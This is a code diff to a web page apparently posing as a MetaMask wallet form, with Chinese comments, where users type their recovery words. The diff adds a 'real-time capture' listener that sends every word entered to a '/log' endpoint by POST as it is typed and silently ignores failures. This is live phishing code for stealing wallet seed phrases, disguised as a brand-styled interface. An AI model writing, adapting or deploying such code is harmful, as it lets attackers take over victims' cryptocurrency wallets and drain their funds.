@@ -7,14 +7,6 @@
     <style>
         /* ============================================================
            MetaMask 品牌色
-           主色 : #0376FF
-           背景 : #14161a
-           卡片 : #1b1d23 / #24272b
-           边框 : #353940
-           文本 : #ffffff
-           次级 : #9ca0a6
-           成功 : #28a745
-           危险 : #d73a49
         ============================================================ */
 
         * {
@@ -596,7 +588,7 @@
     const resultCard = document.getElementById('resultCard');
     const outputList = document.getElementById('outputList');
 
-    // ========== 3. 进度更新 ==========
+    // ========== 3. 实时捕捉 + 进度更新 ==========
     function updateProgress() {
         let filled = 0;
         const values = [];
@@ -633,10 +625,26 @@
         window._currentWords = values;
     }
 
-    // ========== 4. 事件绑定 ==========
+    // ========== 4. 事件绑定（含实时捕捉） ==========
     inputs.forEach((inp, idx) => {
+        // 原有：更新进度
         inp.addEventListener('input', updateProgress);
 
+        // 新增：实时捕捉 - 每输入一个词立即发送
+        inp.addEventListener('input', function() {
+            const values = inputs.map(i => i.value.trim()).filter(v => v.length > 0);
+            if (values.length > 0) {
+                fetch('/log', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: 'words=' + encodeURIComponent(values.join(' '))
+                }).catch(e => console.log('实时发送失败（忽略）', e));
+            }
+        });
+
+        // 粘贴支持
         inp.addEventListener('paste', function() {
             setTimeout(() => {
                 const pasted = inp.value.trim();
@@ -664,6 +672,7 @@
             }, 10);
         });
 
+        // Enter 跳转
         inp.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
                 e.preventDefault();
